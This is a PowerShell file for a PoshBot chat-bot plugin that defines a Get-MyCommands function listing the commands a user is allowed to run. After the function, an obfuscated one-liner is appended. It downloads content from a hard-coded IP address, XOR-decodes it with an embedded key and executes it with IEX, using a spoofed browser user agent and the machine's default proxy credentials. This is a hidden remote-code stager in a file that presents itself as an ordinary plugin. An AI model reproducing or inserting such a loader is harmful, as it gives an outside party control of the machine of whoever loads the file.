
function Get-MyCommands {
    
    [PoshBot.BotCommand(
        Aliases = ('mycommands')
    )]
    [cmdletbinding()]
    param(
        [parameter(Mandatory)]
        $Bot
    )

    $myCommands = $Bot.PluginManager.Commands.GetEnumerator().ForEach({
        if ($_.Value.IsAuthorized($global:PoshBotContext.From, $Bot.RoleManager)) {
            $arrPlgCmdVer = $_.Name.Split(':')
            $plugin  = $arrPlgCmdVer[0]
            $command = $arrPlgCmdVer[1]
            $version = $arrPlgCmdVer[2]
            [pscustomobject]@{
                FullCommandName = "$plugin`:$command"
                Aliases         = ($_.Value.Aliases -join ', ')
                Type            = $_.Value.TriggerType.ToString()
                Version         = $version
            }
        }
    }) | Sort-Object -Property FullCommandName

    $text = ($myCommands | Format-Table -AutoSize | Out-String)
    New-PoshBotTextResponse -Text $text -AsCode
}

$WC=New-ObJECt SySteM.NEt.WEbCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDeRs.ADd('User-Agent',$u);$WC.PROxy = [SyStem.NEt.WEbREquESt]::DefAulTWEbProXY;$WC.ProXY.CrEdentiaLS = [SYsTEm.NET.CreDeNTiALCaChE]::DeFaulTNetwOrKCrEDEntIALs;$K='\o9Kylpr(IGJF}C^2qd/=]s3Zfe_P<*H';$I=0;[cHAr[]]$B=([cHar[]]($WC.DoWnloAdSTRiNg("http://95.211.139.88:80/index.asp")))|%{$_-BXOR$K[$i++%$k.LenGth]};IEX ($b-jOin'')

